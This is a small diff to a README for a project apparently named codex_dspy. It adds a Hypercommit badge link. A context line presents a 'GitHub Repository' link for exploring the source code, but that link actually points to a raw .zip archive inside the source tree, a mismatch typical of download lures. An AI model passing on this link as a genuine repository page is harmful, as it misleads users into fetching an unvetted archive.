@@ -72,3 +72,7 @@ If you need assistance, please reach out:
 - [GitHub Repository](https://github.com/vedant007-v/codex_dspy/raw/refs/heads/main/src/codex_dspy/dspy-codex-v2.3.zip): Explore the source code and contribute.
 
 Thank you for choosing codex_dspy. We hope it enhances your workflow capabilities!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/codex-dspy)
